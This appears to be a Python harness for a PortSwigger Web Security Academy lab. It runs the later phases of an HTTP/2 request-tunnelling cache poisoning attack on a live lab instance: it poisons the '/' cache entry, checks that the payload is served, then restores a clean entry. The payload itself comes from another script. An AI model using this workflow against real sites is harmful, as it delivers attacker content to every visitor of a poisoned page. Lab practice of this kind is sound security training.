#!/usr/bin/env python3
"""Live harness for the phases a *solved* instance never exercises.

The instance is already solved (the lab checker is one-shot), so `solve.py`
short-circuits after its control tunnel. This script drives the remaining
phases against the same live instance to prove they work:

  1. baseline discovery (title, widget, outer Content-Length)
  2. filler-page sizing
  3. poisoning the real cache key ``/`` -- including the cache-miss/hit cycle,
     because a fresh entry (30 s TTL) answers from cache and never reaches the
     back-end
  4. independent verification that ``/`` serves the tunnelled response
  5. restoring a clean ``/`` cache entry

Usage (from the lab folder):
    uv run python smoke_paths.py --url https://<instance>.web-security-academy.net

Exit 0 only if every phase succeeded.
"""

from __future__ import annotations

import argparse
import sys
import time

from solve import (CACHE_TTL, H2Lab, PAYLOAD, discover, fail, hget, log, ok,
                   pick_pages, poison_home)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--wait", type=float, default=90.0)
    args = ap.parse_args()

    started = time.time()
    lab = H2Lab(args.url)
    base = discover(lab)
    log(f"title={base['title']}  widget={base['widget']}  outer_cl={base['outer_cl']}")

    pages = pick_pages(lab, base["outer_cl"])
    if not pages:
        fail("no filler pages")
        return 1

    deadline = time.time() + args.wait
    miss_seen = False
    served = False
    while time.time() < deadline:
        cache, status, in_tunnel = poison_home(lab, pages, tag="smoke poison /")
        miss_seen = miss_seen or cache == "miss"
        _, headers, body = lab.get("/", tag="smoke verify poisoned /")
        served = PAYLOAD.encode() in body
        log(f"poison: x-cache={cache} h2={status} payload_in_tunnel={in_tunnel} | "
            f"GET /: x-cache={hget(headers, 'x-cache')} {len(body)}B served={served}")
        if served and miss_seen:
            break
        time.sleep(3.0)

    if served:
        ok("/ served the tunnelled response containing the payload")
    else:
        fail("/ did not serve the payload")
    if miss_seen:
        ok("the poison request reached the back-end on a cache miss")
    else:
        fail("never observed a cache miss for the poison request")

    widget, _ = lab.widget_state()
    log(f"widget while poisoned: {widget}")

    # restore a clean entry
    deadline = time.time() + CACHE_TTL + 30
    clean = False
    while time.time() < deadline:
        _, _, body = lab.get("/", tag="smoke restore clean /")
        if b"<title>" in body and PAYLOAD.encode() not in body:
            clean = True
            break
        time.sleep(3.0)
    (ok if clean else fail)("clean / entry restored" if clean else "clean / entry NOT restored")

    print(f"[=] requests={lab.requests} elapsed={time.time() - started:.1f}s")
    return 0 if (clean and served and miss_seen) else 1


if __name__ == "__main__":
    sys.exit(main())
